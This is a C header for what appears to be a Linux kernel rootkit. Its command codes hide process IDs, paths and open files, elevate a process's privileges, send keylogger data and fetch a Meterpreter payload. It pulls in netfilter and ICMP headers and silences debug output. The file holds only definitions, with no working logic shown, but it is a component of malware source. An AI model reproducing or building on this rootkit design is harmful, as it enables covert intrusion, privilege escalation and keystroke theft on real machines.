#ifndef INIT_H
#define INIT_H

#include <asm/desc.h>
#include <asm/ptrace.h>
#include <linux/dcache.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/notifier.h>

#include <linux/cred.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/net.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/sched.h>
#include <linux/skbuff.h>
#include <linux/tcp.h>

#define CODE_HIDE_PID 0xde
#define CODE_HIDE_PATH 0xad

#define CODE_ELEV_PID 0xca
#define CODE_HIDE_OPEN 0xfe
#define CODE_SEND_KEYLOGGER 0xba
#define CODE_GET_METERPRETER 0xff

#define dbg_print(fmt, ...) /* No-op */

#endif